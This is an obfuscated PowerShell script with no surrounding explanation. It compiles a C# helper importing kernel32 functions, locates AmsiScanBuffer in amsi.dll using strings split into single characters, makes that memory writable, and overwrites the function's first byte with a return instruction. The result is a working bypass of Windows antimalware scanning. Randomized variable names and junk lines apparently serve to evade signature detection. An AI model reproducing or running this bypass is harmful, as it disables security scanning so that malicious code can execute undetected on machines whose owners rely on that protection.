$wJ4CE7  = @"
using System;
using System.Runtime.InteropServices;
public class wJ4CE7  {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $wJ4CE7

If (1 -eq 1) {
$dOam4C = [wJ4CE7]::LoadLibrary("a" + "m" + "s" + "i" + "." + "d" + "l" + "l")
$AtUl5S = [wJ4CE7]::GetProcAddress($dOam4C, "Am" + "s" + "i" + "Sc" + "an" + "B" + "uf" +"f" + "e" + "r")
$UTK0CX = [Byte[]] (0xC3)
$uJrpyN = 0
[wJ4CE7]::VirtualProtect($AtUl5S, [uint32]5, 0x40, [ref]$uJrpyN)
[System.Runtime.InteropServices.Marshal]::Copy("", 0, $gwjRdZ, 5)
$l4EOEK = 515112520
[System.Runtime.InteropServices.Marshal]::Copy($UTK0CX, 0, $AtUl5S, 1)
}
